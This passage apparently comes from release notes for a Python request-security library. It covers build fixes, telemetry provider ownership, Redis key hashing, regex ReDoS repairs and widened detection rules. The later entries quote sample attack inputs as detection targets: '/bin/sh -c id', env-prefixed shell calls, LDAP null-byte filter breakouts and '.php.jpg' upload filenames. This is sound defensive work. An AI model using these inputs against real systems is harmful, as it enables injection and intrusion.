With `REDIS_PREFIX` unset the word expanded to nothing and the line ran fine, masking the defect; the moment an operator actually set it, `make integration-test` failed outright before pytest ever started, loudly rather than silently. `Makefile:241` now prefixes both `uv run pytest` invocations with `env`, `env ${REDIS_PREFIX:+REDIS_PREFIX="$REDIS_PREFIX"} uv run pytest ...`, so `env` builds the child process's environment from its own operand list instead of the shell trying to parse the expanded word as an assignment; reverified the same way, both `make VAR=val target` and `VAR=val make target` invocation forms, under both `/bin/sh` and `dash`, for unset, plain, space-containing, single-quoted, double-quoted, and trailing-colon-suffixed values, in every case by reading `os.environ` inside the invoked process rather than only checking that the shell word expanded as expected. `ci.yml` and `detection-gate.yml` had the hardcoded value dropped outright: each CI job already gets its own ephemeral Redis service with no concurrent second suite to collide with, so the pin was harmless there in practice, but it was also dead weight inconsistent with the isolation model and a latent footgun against any future change to CI topology (self-hosted runners, reused services, added concurrency), so it was removed for consistency rather than left as a silent exception.
  - `make integration-test` never collected `tests/test_sync/integration/test_otel_jaeger_integration.py`, the sync mirror of `tests/integration/test_otel_jaeger_integration.py`, because `Makefile:241` passed only `tests/integration` as the pytest path argument. The sync test existed and was never executed in any release; `--collect-only` showed 1 item where 2 exist. Collecting both into the same pytest process surfaced a second, distinct defect: `AssertionError: Jaeger did not register service 'guard-core-integration' within 10s`, with `WARNING  opentelemetry.trace:__init__.py:556 Overriding of current TracerProvider is not allowed` and the matching `MeterProvider` warning in the captured log. OpenTelemetry's tracer/meter providers are process-global singletons settable once; the async test's `OtelHandler.start()` claims them first, the sync test's own `start()` call is then silently refused by the SDK, and the sync test's spans go out through the first test's already-shut-down exporter instead of reaching its own Jaeger container, so the wait times out. Fixed as an isolation problem, not a test problem: `Makefile:241` now runs the two integration paths as two separate `uv run pytest` invocations, each its own OS process with clean OTel global state, sequentially in one recipe, with the combined exit status explicitly aggregated (`STATUS=1` on either invocation's failure, `exit $STATUS` at the end) so a failure in either invocation fails the target rather than only the last one's status surviving. With process isolation in place both invocations pass independently (`1 passed` each), confirming the diagnosis: the sync `OtelHandler` path itself was not broken, only the shared-process collision was.

- **The build-cache cleanup step repeated across 20 Makefile targets could silently delete an unrelated file or directory, and separately fail to clean the cache it was meant to remove, whenever any path under the repository contained whitespace.** Every one of the 20 recipes piped `find .`'s newline-separated path list into `xargs rm -rf` to clear `__pycache__`, `.pyc`, `.pyo`, `.pytest_cache`, `.ruff_cache`, and `.mypy_cache` artifacts; `xargs` splits its input on whitespace, not newlines, so a real path such as `my project/__pycache__` arrived at `rm -rf` as two unrelated arguments, `my` and `project/__pycache__`. Demonstrated first-party against a real (non-dry-run) scratch tree carrying all six cache kinds plus a top-level `my` directory sitting alongside an unrelated `my project/__pycache__`: the old idiom deleted the entire `my` directory outright, an unrelated path that was never meant to be touched, while leaving the real `my project/__pycache__` uncleaned, since the malformed second argument `project/__pycache__` never resolved to an existing path from the working directory either, so the one thing the step existed to remove survived. The identical recipe line appeared in `install`, `install-dev`, `lock`, `upgrade`, `lint`, `fix`, `vulture`, `bandit`, `safety`, `pip-audit`, `radon`, `xenon`, `deptry`, `semgrep`, `local-test`, `integration-test`, `serve-docs`, `lint-docs`, `fix-docs`, and `clean`, so any of these could misfire on a checkout path, or any path beneath it, containing a space. All 20 sites now share one `CLEAN_CACHES` Make variable, `find . \( -name '__pycache__' -o -name '*.pyc' -o -name '*.pyo' -o -name '.pytest_cache' -o -name '.ruff_cache' -o -name '.mypy_cache' \) -prune -exec rm -rf {} +`, which hands each matched path to `rm -rf` as its own `exec` argument regardless of embedded whitespace, prunes rather than descends into a matched directory, and is a no-op when nothing matches (`-exec ... +` never invokes the command at all with zero accumulated matches). Re-run against the same scratch tree, the new form leaves the unrelated `my` directory and its contents untouched and correctly removes `my project/__pycache__`, with every whitespace-free target (the top-level `.pytest_cache`, `.ruff_cache`, `.mypy_cache`, and the `.pyc`/`.pyo`/`__pycache__` entries nested under `src/guard_core`) cleaned identically to the old idiom.

- **`OtelHandler` no longer clobbers or destroys a telemetry provider it does not own.** `start()` called `opentelemetry.trace.set_tracer_provider()` and `metrics.set_meter_provider()` unconditionally, and `stop()` shut down whatever `trace.get_tracer_provider()` / `metrics.get_meter_provider()` returned at that moment: the ambient global, not necessarily anything guard-core installed. OpenTelemetry's own API already refuses to overwrite an existing global provider (`set_tracer_provider` / `set_meter_provider` are set-once per process; a second call logs "Overriding ... is not allowed" and silently no-ops), so a host application's own provider survives `start()` unclobbered; the defect surfaces at `stop()`, which still called `.shutdown()` on whatever the ambient global happened to be, tearing down a still-live provider guard-core never installed. Verified two ways with the real SDK, not mocks: a host app that configures its own tracer/meter provider before guard-core starts keeps its provider through `start()`, but `handler.stop()` used to shut it down outright, killing a provider still in active use; and two guard-core instances in one process, the realistic multi-tenant or test-suite case, the second instance's `start()` silently bound itself to the first instance's provider without installing its own, and the second instance's `stop()` used to shut down the first instance's still-live provider out from under it, both without raising, so nothing signaled the loss. `OtelHandler` now claims ownership explicitly: `start()` installs its own `TracerProvider` / `MeterProvider`, then reads the global back and compares identity; if it won, it records ownership, if a provider was already ambient (host-installed, or another guard-core instance won a concurrent race), it discards its own unused provider immediately, no thread leak, and borrows the ambient one without claiming it. When guard-core loses the race, it now also logs a warning through its own `guard_core` logger naming the signal (tracer or meter) and the configured endpoint that will not receive its traffic, since OpenTelemetry's own set-once warning goes to OpenTelemetry's logger, not guard-core's, and would otherwise be invisible to an operator who set `otel_exporter_endpoint` and never learns it is not in effect. `stop()` shuts down only a provider this instance recorded owning, never the ambient global, and is safe even if OpenTelemetry's own `atexit` hook (registered on every `TracerProvider` it constructs) later calls `shutdown()` again on the same object; `TracerProvider.shutdown()` and the underlying batch processor are both idempotent, verified directly against the installed SDK, and covered by a test that shuts a provider down a second time from outside `OtelHandler` after `stop()` already ran. Both `start()` and `stop()` are idempotent and safe in any order: double `start()`, double `stop()`, `stop()` before `start()`, `start()` after `stop()`. A per-instance lock keeps concurrent `start()` / `stop()` calls on the same instance from corrupting that instance's own ownership bookkeeping, while OpenTelemetry's own process-wide set-once guard, already thread-safe, arbitrates ownership races across instances and threads. One limitation is inherent to OpenTelemetry's API and not fixable here: once a process's global provider has been installed and later shut down by whichever instance owned it, no later `start()` in that process, same instance or a different one, can install a fresh one; OpenTelemetry exposes no public "unset" API. A restarted instance stays safe, no crash, no double shutdown, but its telemetry stays inert until the process itself restarts.

- **`LogfireHandler` no longer overwrites a host application's Logfire configuration, the mirror image of the `OtelHandler` defect above and, since Logfire has no set-once guard of its own, more user-visible.** `start()` called `logfire.configure(service_name=self._config.logfire_service_name)` unconditionally. Read against the installed `logfire` 4.40.0 source: `logfire.configure()` always operates on the single process-global `GLOBAL_CONFIG` singleton (`Logfire()`'s default `config` argument, reachable publicly as `logfire.DEFAULT_LOGFIRE_INSTANCE.config`) and its `LogfireConfig.configure()` always resets and fully reloads that singleton's state, service name included, on every call; the underlying OpenTelemetry tracer/meter/logger providers it wires up are guarded once per process by Logfire's own internal `_has_set_providers` flag, but the visible identity, service name, resource attributes, and every other `configure()` argument, are not. So where OpenTelemetry made the host win and guard-core silently lose, Logfire made guard-core win and the host silently lose: a host application that had already called `logfire.configure(service_name="host-app-service")` before guard-core started had its entire telemetry stream, its traces, not just guard-core's, silently relabeled with guard-core's service name the moment `LogfireHandler.start()` ran. `stop()` was an unconditional `pass`, so there was never a teardown-destruction half to this one; that made it a narrower defect than the OTel one but not a smaller one from a host's point of view. Verified against the real installed library, not mocks: `logfire.DEFAULT_LOGFIRE_INSTANCE.config.service_name` read `host-app-service` before `start()` and `guard-core` after it, unconditionally. `LogfireHandler` now checks `logfire.DEFAULT_LOGFIRE_INSTANCE.config._initialized`, the same internal flag Logfire's own `warn_if_not_initialized()` uses to answer "has `configure()` already run", before calling `configure()`; if it is already `True`, guard-core does not call `configure()` and logs a warning through its own `guard_core` logger naming the `logfire_service_name` that will not be applied, so an operator who set it learns their setting is not in effect, the same reasoning as the `OtelHandler` warning. If it is `False`, guard-core configures Logfire and records that it did. Unlike OpenTelemetry's set-once guard, Logfire's `configure()` has no arbiter for two callers racing to be first, so a module-level lock, shared across every `LogfireHandler` instance in the process rather than the per-instance lock used for OTel, serializes the check-then-configure sequence; six real threads racing `start()` across six instances against the real library reproducibly ends in exactly one owner, verified across repeated runs, not by inspection. `stop()` now calls `logfire.shutdown()`, which flushes and shuts down the tracers, meters, loggers, and OTLP forwarding Logfire installed, but only when this instance recorded that it configured Logfire; a borrowed configuration is never touched. This is a net addition, not a narrower version of prior behavior: `stop()` was `pass` unconditionally before, so no scenario existed where the old code flushed or shut anything down on `stop()`, owned or not, there is nothing this change now declines to clean up that the old code used to. Verified idempotent against the real library: `LogfireConfig.shutdown()` delegates to `MeterProvider.shutdown()`, which logs a benign "shutdown can only be called once" warning and returns cleanly on a second direct call, so a `logfire.shutdown()` arriving again from outside `LogfireHandler` after `stop()` already ran, an `atexit`-equivalent scenario, does not raise. Double `start()`, double `stop()`, `stop()` before `start()`, and `start()` after `stop()` are all safe; restart-after-stop is inert for the same structural reason as `OtelHandler`, since Logfire's `_initialized` flag is never reset by `shutdown()`, so a subsequent `start()` on the same instance sees "already configured" and correctly declines to reclaim ownership rather than silently double-configuring.

- **`scripts/unasync.py --check` no longer reports a missing sync mirror as "up to date," and no longer deletes a mirror it just correctly generated.** Check mode snapshotted the current `guard_core/sync/` and `tests/test_sync/` trees, regenerated in place over the real working tree, diffed each generated file against the snapshot, then restored the real tree from that same snapshot. A brand-new file has no counterpart in the pre-generation snapshot, so the diff loop's `if not tmp_file.exists(): continue` silently skipped it instead of flagging it, `ok` stayed `True`, and the script printed "OK: sync code is up to date" and exited 0 while the file did not exist. The unconditional restore at the end then deleted the correctly-generated tree and replaced it with the pre-check snapshot, which never had the new file either, so the working tree ended up exactly as if `--check` had never run: a new async-only source or test file could go through the gate with no sync mirror and no error. Verified first-party on a clean base extraction: creating an async-only test file and running `--check` printed "OK" while the mirror still did not exist afterward. Check mode now generates into a temporary directory inside the repo root (so ruff's own config discovery still finds `pyproject.toml`), formats that copy the same way `make sync` formats the real one, and compares it against the untouched real tree; a file present in the async tree with no real counterpart now prints `MISSING: <path>` and the check exits non-zero, and a mismatched existing file still prints `CHANGED: <path>` as before. The real tree is never written to during `--check`, so there is nothing to restore and nothing that can be deleted; `git status --short` on a dirty tree is now provably identical before and after a `--check` run, not just usually identical. Pinned with a test that creates a throwaway async-only source, runs `--check` against the real repository, and asserts both the non-zero exit and the `MISSING:` message, confirmed red-first against the base extraction where the unfixed script exits 0. The reverse hole existed too, and was pre-existing on base, not introduced by this fix: `collect_source_files()` / `collect_test_files()` only ever walked the async trees looking for a missing sync counterpart, so a sync file whose async source had been deleted, or that never had one, was never looked for at all; `--check` reported "OK" with five such orphans already sitting in `tests/test_sync/` (an empty leftover `test_handlers/__init__.py` package marker with no code anywhere referencing it, deleted, plus four sync-only concurrency test files testing `guard_core.sync`-only internals with no async counterpart by design, added to `HAND_MAINTAINED` alongside the repo's existing sync-only-concurrency-test convention). Check mode now also walks both sync trees and reports `ORPHAN: <path>` for anything with no async source and no `HAND_MAINTAINED` exemption, pinned the same way as the missing-mirror case. The temporary directory `--check` builds now uses a distinctive `.unasync_check_tmp_` prefix, gitignored, so a hard kill mid-run leaves debris that `git status` and the default clone stay clean of; the directory is swept for stale siblings from a previous crashed run before each new `--check`, and a repo root that cannot be written to now fails with a one-line message naming the path and the underlying error instead of a raw `PermissionError` traceback out of `mkdtemp`. Adding this prefix to `[tool.ruff] exclude` was tried first and reverted: ruff's own directory-exclusion prunes traversal into any path matching an exclude pattern even when that exact path is passed explicitly on the command line, which is exactly what `format_generated()` does against the temp directory, so the exclude entry silently stopped ruff from ever formatting the generated tree and turned every file into a false `CHANGED`, caught by a full local test run showing the entire sync tree flagged, not by any single test; `.gitignore` alone is sufficient, since ruff already skips gitignored paths during its own default recursive discovery (`ruff check .`) without needing `force-exclude`, and does not apply that skip to a path named explicitly, which is the distinction the fix actually needed. `[tool.mypy] exclude` keeps its entry since mypy is never invoked against the temp directory by this script.

- **`LogfireHandler.start()` could get permanently stuck refusing to retry after a single transient `logfire.configure()` failure.** The instance-level idempotency flag was set to `True` before the fallible `configure()` call, not after it succeeded, so a `configure()` that raised, network hiccup, invalid token, anything, left the flag `True` forever; every subsequent `start()` call on that instance then saw the flag already set and returned immediately without calling `configure()` again, silently and with no exception, no log line, and no way to recover short of constructing a new handler. `OtelHandler`'s equivalent guard already gets this right, `self._tracer is not None`, set only after genuine success, and was unaffected. The flag is now set only once the outcome is actually known: immediately when borrowing an already-configured ambient instance (that decision cannot un-happen later in the process), and only after `logfire.configure()` returns without raising when this instance is the one configuring. A failed `configure()` call now leaves the instance exactly as if `start()` had never been called, so the next `start()` retries the full sequence. Pinned two ways: a mock-based test proving the instance is not stuck immediately after one failure, and a second proving a transient failure followed by a successful retry actually reaches `logfire.configure()` a second time and completes, plus the equivalent against the real, unmocked library via a monkey-patched `logfire.configure` that fails once then delegates to the real function. Confirmed red-first against the base extraction, which has no `_started` attribute to check at all since the old code called `configure()` unconditionally on every `start()`.

- **`tests/test_sync/test_otel_handler_provider_lifecycle.py` is hand-maintained, not mechanically generated, and that stays true only because the mechanical translator cannot express it.** The file drives `OtelHandler.start()` / `.stop()` through the real, unmocked OpenTelemetry SDK from real OS threads inside disposable Python subprocesses, one process per test, because OpenTelemetry's global provider state is set-once for the life of a process and cannot otherwise be reset between tests; the subprocess bodies are therefore Python source embedded as string literals, not executable statements in the test file itself. `scripts/unasync.py`'s `async def` / `await` stripping is a line-oriented regex transform with no awareness of string-literal boundaries, so running it against this file corrupts the embedded snippets (confirmed directly: it injects a stray `pass` and duplicate imports into the middle of a triple-quoted string) rather than leaving them alone. Restructuring the test to avoid subprocess isolation was not viable without weakening it: an in-process `asyncio.gather` cannot exercise the real cross-thread race this file proves safe, because `OtelHandler.start()` has no internal `await` point, so two coroutines cannot interleave inside it on one thread; only real OS threads reach the race this test exists to cover. Added to `HAND_MAINTAINED` for that reason, not because a mechanical mirror would have been more work. The two files are kept from silently drifting apart by `test_hand_maintained_otel_provider_lifecycle_pair_test_names_match` in `tests/test_unasync_check_gate.py`, which reads both files' `test_*` function names directly off disk and fails if the sets differ; confirmed to fail when one side's test is renamed without the other.

- **The Redis sink behind `BehaviorTracker.track_endpoint_usage`/`track_return_pattern` (`guard_core/handlers/behavior_handler.py`) no longer interpolates `endpoint_id`, `client_ip`, or the rule-supplied `pattern` into a `KEYS` glob, closing the sink-side half of the glob-injection issue that `_extract_from_forwarded_header`'s validation (`e014cc78`, `guard_core/utils.py`) only closed from the caller side.** `track_endpoint_usage` (line 82) built `f"behavior:usage:{endpoint_id}:{client_ip}"` and `track_return_pattern` (line 108) built `f"behavior:return:{endpoint_id}:{client_ip}:{rule.pattern}"` verbatim from all three call-supplied values, none validated at this layer, then globbed on the result (`KEYS behavior_usage:{key}:*` / `behavior_returns:{key}:*`) to count hits; a value containing a Redis glob metacharacter (`*`, `?`, `[`, `]`, `\`, the same set `_extract_from_forwarded_header` rejects) matched other identities' keys, so a caller reaching the sink directly, or any future caller that does not replicate the extractor's validation, could inflate or evade another identity's threshold count. `rule.pattern` was doubly exposed: it is operator/agent configuration, `BehaviorRuleConfig.pattern` (`guard_core/_security_config_validators.py`) has never restricted its character set, and no extractor of any kind sits between it and the sink. All three values now pass through a new `_hash_identity_segment` (`hashlib.sha256(value.encode()).hexdigest()`), so the constructed key becomes `behavior:usage:{sha256(endpoint_id)}:{sha256(client_ip)}` / `behavior:return:{sha256(endpoint_id)}:{sha256(client_ip)}:{sha256(rule.pattern)}`. Hashing each segment independently, rather than hashing one joined string, also closes a field-boundary collision a joined hash would not: without per-segment hashing, `endpoint_id="a:b", client_ip="c"` and `endpoint_id="a", client_ip="b:c"` address the same key and share a count, demonstrated live and pinned by `test_track_endpoint_usage_redis_hashing_prevents_field_boundary_collision` / `test_track_return_pattern_redis_hashing_prevents_field_boundary_collision`. The blocking, whole-keyspace `KEYS` scan and the one-new-key-per-request growth are eliminated together rather than traded for an incremental `SCAN`, which would still cost O(N) over the same keyspace: counting is now `RedisManager.record_sliding_window_hit` (`guard_core/handlers/redis_handler.py`), one pipelined round trip that `ZADD`s the hit as a sorted-set member scored by its timestamp, `ZREMRANGEBYSCORE`s entries scored below the window start, `ZCARD`s the remainder, and refreshes the key's `EXPIRE` to the rule window, addressed to the single key the hashed identity resolves to; no glob and no keyspace-wide scan are issued at any point. **The member itself is `uuid.uuid4().hex`, not the timestamp.** A sorted set stores one entry per unique member, so two hits landing on the identical timestamp collapsed into a single counted entry regardless of how many times the client actually hit the endpoint -- a live defect the old code carried too, since it embedded the timestamp in the *key name* it wrote, and not something this change introduced, but it lives in the exact function being rewritten here so it is closed in the same pass. Not hypothetical, and worse in practice than a probe that lets timestamps spread naturally would suggest: a 3,000-request concurrent burst with timestamps captured eagerly -- the way a real burst actually arrives, one `time.time()` call per request with no gap engineered in -- collapsed to 166 stored entries and lost 2,834 hits, 94.47%, before this fix, and lost none after. Practical effect: a `usage`/`frequency` rule with threshold N effectively required roughly 20x N requests to trip, and under a sufficiently coarse clock it could fail to trip at all. The frozen-clock case is that extreme made concrete, not a synthetic edge case: a burst of 50 same-instant `track_endpoint_usage` calls at `threshold=10` tripped nothing (`ZCARD` stuck at 1) before this fix and correctly reached 50 after. The clock coarseness driving both is itself measured, not assumed: a tight loop of 200,000 `time.time()` calls on the host this was verified on yielded only 36,209 unique values. The score is untouched by this -- still the raw timestamp -- so the window-boundary and pruning behavior described below is unaffected, confirmed by re-running the same boundary and old-vs-new equivalence proofs after this change with byte-identical results. Pinned by `test_record_sliding_window_hit_identical_timestamps_each_count_separately` and `test_track_endpoint_usage_redis_frozen_clock_still_trips`, neither of which the pre-existing strictly-increasing-timestamp tests would have caught. **This also changes the per-identity memory footprint: hits sharing a timestamp used to collapse into one stored entry, scaling with clock granularity, and now each hit stores its own entry instead, scaling with request rate times window length** -- still bounded by the same prune-plus-`EXPIRE` cap at one window's worth, not unbounded, but an operator sizing Redis for a high-traffic identity under a long window should budget for one entry per request in that window, not one per distinct instant. **Upgrading resets every identity's in-window counter to zero once traffic starts hitting the new key shape**, since the hashed sorted-set key never existed under the old code and the old literal-string keys are never read by the new code: there is no double counting, the two key shapes are never read together, and no leak, since every pre-upgrade key already carries its own TTL (the rule window) from when it was written and self-expires on its own within at most one window, no action needed. Counting semantics are unchanged: an entry is still counted if and only if its timestamp is at or after the window start (`ZREMRANGEBYSCORE`'s upper bound is exclusive, matching the prior `timestamp >= window_start` filter, so a boundary-exact entry survives pruning), the rule still trips when the count exceeds the threshold, and a quiet identity's key still disappears on the rule's window TTL; proven equivalent to the pre-fix implementation by replaying an identical fixed-clock call sequence crossing the window boundary through both trees side by side (the pre-fix tree read via `git archive HEAD` into `/tmp`, never checked out over the working tree), yielding a byte-identical trip-decision sequence on both `usage` and `return_pattern` rules. Covered by new tests in `tests/test_redis/test_redis.py` (`record_sliding_window_hit` accumulation, window pruning, inclusive-boundary, TTL expiry, identical-timestamp uniqueness, and disabled-Redis paths) and `tests/test_decorators/test_behavior_handler.py` (hashed-key construction, window-boundary trip/reset, field-boundary-collision isolation, frozen-clock trip, and glob-metacharacter isolation of `client_ip`, `endpoint_id`, and `rule.pattern` individually, calling the sink directly so the proof holds independent of any upstream validation); mirrored in `tests/test_sync/`. The in-memory fallback used when Redis is absent is untouched.

- **The four `file_upload` `filename=` patterns carried a `[^"']{0,255}` cap, a live shipping bypass: a filename with an ordinary-length prefix before its dangerous extension (256+ characters, well within what a real upload client sends) evaded detection entirely.** Measured before this fix, `filename="` + 254/255 `A`s + `.php.jpg"` detected, 256 `A`s did not; a 335-character realistic filename (`invoice_2026_Q1_report_report_..._quarterly_close.php.jpg`) also evaded, at both the `_FILE_UPLOAD_DOUBLE_EXTENSION_RE`/`_FILE_UPLOAD_TRUNCATION_RE`/`_FILE_UPLOAD_DECODED_TRUNCATION_RE` sites (`{0,255}`/`{0,254}` caps) and the standalone dangerous-extension pattern (`.*?`, unbounded but, per the same measurement approach, quadratic under many repeated `filename="` occurrences sharing one distant or absent closing quote). A `{0,N}` cap converts CVE-2025-53539-style unbounded ReDoS into a CVE-2025-54365/GHSA-rrf6-pxg8-684g-style length-cliff bypass; it does not fix anything, it relocates the bypass to N+1. Both are now fixed the same way: the `{0,N}` caps are removed (`[^"']*`, `.*?` becomes `[^"']*` too) and a new `_file_upload_scan_window` helper truncates the content each `file_upload` pattern scans to end at the last quote character (`"` or `'`) found anywhere in it, applied in `_check_regex_patterns` for `category == "file_upload"` only. A `[^"']*` scan started anywhere inside that window is always bounded by a real quote character, so it is linear per position with no length cliff; content with no quote at all (a pattern that structurally requires one to match) is excluded from the scan entirely rather than walked to the end looking for one that cannot be there. Measured through the wire (`detect_penetration_attempt`, all four patterns, 4-doubling sweep up to `detection_max_body_inspect_bytes` = 10485760 bytes, adversarial fill of many `filename="` occurrences sharing a single distant or absent closing quote, drawn from the patterns' own non-quote-exclusion overlap): time grows ~2x per doubling (linear) both before and after, versus ~4x (quadratic) on the pre-fix standalone pattern at smaller sizes where it still completed. All four filename-length cases above (254/255/256/335) now detect. New tests: `tests/test_detection/test_multipart_file_part_scanning.py::test_malicious_upload_long_filename_prefix_still_detected` (254/255/256/320-char padding) and `::test_malicious_upload_realistic_long_filename_detected`; `tests/test_detection/test_builtin_pattern_safety.py::test_file_upload_patterns_resist_unclosed_filename_padding` (linearity, all four patterns) and `::test_file_upload_scan_window_bounds_to_last_quote` (helper unit coverage). Both trees.

- **Three `xss` patterns (event-handler, `href`/`src`/`data`/`action`, and `style=expression/behavior/url`) were still genuinely quadratic after the prior round's `_HTML_TAG_OPEN_RE` re-spelling, which changed their shape but not their complexity.** All three carry `[^<>]*` immediately adjacent to a second, overlapping unbounded quantifier: `[\s/]+`/`\s+` for the event-handler and href/src patterns (overlap on space and slash), and `[\s"']*[^<>"']*` for the style pattern (overlap on whitespace). Measured with adversarial fill drawn from that overlap (spaces and slashes, not letters, which read falsely linear): all three grow ~4x per size doubling (quadratic), the href/src pattern taking ~2.2s at 12009 characters. Fixed structurally, not by capping: the event-handler and href/src patterns now require the free-form tag content to end on a single mandatory non-separator character before the separator run, `(?:[^<>]*[^<>\s/])?` and `(?:[^<>]*[^<>\s])?` respectively, wrapped optional so the zero-free-span form (`<a onclick=...>`) still matches; a single non-quantified atom between two previously-adjacent broad quantifiers removes the ambiguous split that caused the quadratic backtracking, without narrowing what can appear before the separator (multi-attribute padding, e.g. 30 repeated `data-x="junk" ` attributes before `href=`, still detects). The style pattern's `[\s"']*[^<>"']*` is replaced by the already-established bounded `\s{0,20}` whitespace fragment (`_ATTR_EQUALS_WHITESPACE_RE`, already used elsewhere in this file for the same reason) plus a single optional quote atom, `\s{0,20}[\"']?[^<>"']*`; an earlier attempt at this fix collapsed the pair to a single unbounded `[^<>]*`, which is linear but a false positive: `<div style="color:red" title="see url(icon.png) for reference">` matched, because the broadened scan could cross out of the `style` attribute into an unrelated one. The final fix stays confined to the `style` attribute's own value and does not reproduce that false positive (covered by a new regression test). Measured through the compiled patterns directly, 4-doubling sweep up to the 10485760-byte body cap with multiple adversarial fills (pure separator runs, many short tag-opens, many repeated marker occurrences): all three grow ~2x per doubling (linear) after the fix, both attack recall (multi-attribute padding, whitespace-tolerant event handlers, all previously-passing cases) and the existing benign corpus unaffected. New tests: `tests/test_detection/test_builtin_pattern_safety.py::test_xss_event_handler_still_matches_real_attack`, `::test_xss_event_handler_resists_separator_padding`, `::test_xss_href_javascript_resists_separator_padding`, `::test_xss_style_expression_resists_separator_padding`, `::test_xss_style_expression_does_not_cross_into_unrelated_attribute`. Both trees.

- **`ban_ip()` no longer bans loopback or trusted-proxy addresses.** On a reverse-proxy deployment (Render, Heroku, and similar, terminating TLS and connecting from localhost) with `trusted_proxies` left unset, every request resolves to `127.0.0.1`; any auto-ban path (suspicious-activity, behavioral, or dynamic-rule escalation) that banned that address locked out all traffic, a self-inflicted whole-app outage. `IPBanManager.ban_ip()` now refuses a ban whose target, exact IP or CIDR, overlaps `127.0.0.0/8` or `::1/128`, and refuses one that overlaps any configured `trusted_proxies` entry (also CIDR-aware). The loopback check needs no config and applies even when none is wired; the trusted-proxy check degrades gracefully to loopback-only when config or `trusted_proxies` is absent. A refusal is a logged warning naming the target and the reason, never an exception, so callers in the hot path are unaffected; the ban is skipped rather than applied. There is no opt-out.

- **A Redis-down ban above the 1-hour local-cache cap now applies at 1 hour instead of applying nothing.** `IPBanManager._assert_local_cap` raised `ValueError` whenever a ban duration exceeded `LOCAL_CACHE_TTL_CAP_SECONDS` (3600s) with Redis unavailable, whether never configured (`_ban_cidr`, `_ban_exact_ip`) or failing mid-request (`_ban_cidr`'s Redis-failure fallback), and the ban write path called it *before* writing anything, so a 24-hour auto-ban with Redis down applied zero protection. Verified through the real pipeline (`SecurityCheckPipeline` + `SuspiciousActivityCheck`, Redis mocked down): this was not just a silent gap. With the default `fail_secure=True`, the `ValueError` was caught by the pipeline's per-check error handler and turned into an HTTP `500 "Security check failed"` for every request from an IP that tripped the auto-ban threshold, repeating on every subsequent request for as long as Redis stayed down, an availability bug distinct from the missing ban (`fail_secure=False`, opt-in only, instead swallowed it: no ban, no crash, no protection). The renamed `_clamp_to_local_cap` now clamps the duration to the 3600s ceiling and logs a warning naming the cause (`not configured` or `request failed`) and the shortened duration, instead of raising, at all three call sites. The loopback/trusted-proxy refusal above still runs first in `ban_ip`, so a loopback or trusted-proxy target is refused outright and never reaches the clamp; it is never banned for an hour. Idea credited to CatamountJack.

- **The `:!region` carve-out for `block_cloud_providers` has never worked in any release that shipped it (3.2.0 through 3.12.0).** The syntax and the refresh code arrived together in 3.2.0: every refresh path (`_refresh_providers`, `refresh_async`, `_refresh_providers_via_redis_handler`) looked the range fetcher up by the literal selector string, the resulting `KeyError` was swallowed by the per-provider error handling, and the provider's IP ranges stayed empty forever, so a selector-configured provider blocked nothing, silently, since the feature's first release. `is_cloud_ip`'s own selector parsing was always correct; it just evaluated against ranges that refresh never filled. `get_cloud_provider_details` had the same literal-key lookup (never a user-visible symptom on its own, since the block that would trigger it never fired, but fixed with the same change). All four lookup sites now normalize selectors to bare provider names before lookup; the carve-out decision itself stays where it always was, in `is_cloud_ip`. Found by an executed cross-session repro; the new regression tests exercise ALL THREE refresh paths with a selector, the exact complement the 100-percent-covered suite was missing.

- **Absolute-path and env-prefixed shell invocation now detected in `cmd_injection`.** Both bare-shell-with-`-c` patterns required the shell name to sit immediately after `\A`, `;`, or a newline, so `/bin/sh -c id` and `env bash -c id` never matched even though the unqualified `sh -c id` and `; bash -c id` shapes already did. Both patterns now allow an optional leading `env` token and an optional path prefix (`/bin/`, `usr/local/bin/`, and so on) before the shell name; the flag requirement (`-c`, or any `-[a-zA-Z]+` on the semicolon-anchored variant) is unchanged, so plain mentions like "the path /bin/sh is the default shell" still do not match. `cmd_injection` recall on the pattern-layer benchmark rises from 22/25 to 24/27 detected; the benign corpus stays at 0/239 for this widening measured alone (see the known false positive documented below, once the env-prefixed widening lands too).
- **Two LDAP filter breakout shapes now detected.** `*)((objectClass=*` (a double open-paren after the wildcard-close, used to hijack filter precedence) fell through the wildcard-chain pattern because it required exactly one `(` between `*)` and the attribute name; the pattern now accepts one or more. `*))%00` (a percent-encoded null byte used to truncate a filter string past its intended close) matched none of the four LDAP patterns, none of which had ever handled null-byte truncation; a new pattern (`\*\)+%00`) was added for it. `ldap` recall on the pattern-layer benchmark rises from 6/6 to 8/8; the benign corpus stays at 0/239. An adversarial review then found `\*\)+%00` too loose: it matched decontextualized text like "glob pattern: *)%00 in filenames", which carries only one closing paren before the null byte. The gap payload the pattern exists for is `*))%00`, always two closing parens, so the pattern was tightened to `\*\)\)+%00`. That tightening turned out to be a regression, not just a fix: it also silently dropped the realistic single-paren LDAP null-byte breakout, an attribute assignment followed by a wildcard, a single closing paren, and the null byte (`uid=*)%00`, `mail=*)%00`, `objectClass=*)%00`, and the same shape opened with a filter paren, `(uid=*)%00`), because that shape carries only one closing paren, the exact count the tightening was built to reject. The null-byte pattern now anchors to LDAP filter structure instead of counting parens alone: an attribute assignment (`[a-zA-Z][\w-]*\s*=`) followed by optional value characters, a wildcard, one or more closing parens, then the null byte, alternated with the untouched bare `\*\)\)+%00` double-paren form. `*))%00` and all four single-paren attribute breakouts now detect at both the pattern and end-to-end layers, and the glob-mention prose still matches neither. `ldap` recall on the pattern-layer benchmark rises from 8/8 to 12/12; the benign corpus stays at 0/253.
- **Path-prefixed `env` shell invocation now detected in `cmd_injection`.** The optional `env` token in both bare-shell patterns only recognized a bare `env`, not one carrying its own path prefix, so `/usr/bin/env bash -c id` and `; /usr/bin/env sh -c id` never matched even though `env bash -c id` already did. Both patterns now allow an optional path prefix (`/usr/bin/`, `usr/local/bin/`, and so on) before the `env` token itself, on top of the path prefix already allowed before the shell name; the flag requirement is unchanged, so a script that merely ends in a shell name, `; ./deploy.sh -f`, `scripts/run.sh -v`, still does not match. `cmd_injection` recall on the pattern-layer benchmark rises from 24/27 to 26/29 detected; the benign corpus grows to 243 cases (see the known false positive documented below).
